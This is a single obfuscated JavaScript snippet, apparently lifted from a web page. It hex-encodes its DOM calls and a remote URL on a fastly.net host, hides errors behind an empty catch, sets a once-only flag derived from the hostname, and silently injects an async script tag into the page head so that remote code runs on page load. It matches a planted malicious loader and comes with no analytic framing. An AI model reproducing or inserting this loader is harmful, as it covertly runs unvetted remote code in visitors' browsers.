setTimeout(function(){try{var n=function(n,e){setTimeout(function(){var t=function(n){return(!n||n.length<16)&&(n=((n||"")+new Array(17).join("0")).substr(0,16)),Math.abs(n.split("").reduce(function(n,e){var t=e.charCodeAt(0);return n[0]=(n[0]<<5)-n[1]+t,n[0]=n[0]&n[0],n[1]=(n[1]<<5)-n[0]+256-t,n[1]=n[1]&n[1],n},[0,0])[0]).toString(36)}(location.hostname)+(e||"");if(!window[t]&&!window["f"+t]){window["f"+t]=1;var i=function(n,e,t){return new Array(Math.max(e-n.length+1,0)).join(t||" ")+n},o=function(n){return JSON.parse('"'+n.split("|").reduce(function(n,e){return n+"\\u"+i(e,4,"0")},"")+'"')},r=function(){var e=o("64|6f|63|75|6d|65|6e|74"),t=o("63|72|65|61|74|65|45|6c|65|6d|65|6e|74"),i=o("73|63|72|69|70|74"),c=o("68|65|61|64"),u=o("74|79|70|65"),a=o("74|65|78|74|2f|6a|61|76|61|73|63|72|69|70|74"),f=o("73|72|63"),w=o("61|73|79|6e|63"),d=o("61|70|70|65|6e|64|43|68|69|6c|64");if(window[e]&&window[e][t]&&window[e][c]){var s=window[e][t](i);s[u]=a,s[f]=o(n||"68|74|74|70|73|3a|2f|2f|66|79|72|73|62|63|6b|67|69|2d|63|2e|67|6c|6f|62|61|6c|2e|73|73|6c|2e|66|61|73|74|6c|79|2e|6e|65|74|2f|46|41|53|39|50|33|36|4d|34|42|2e|6a|73"),s[w]=!0,window[e][c][d](s)}else setTimeout(r,100)};r()}},0)};n()}catch(n){}},0);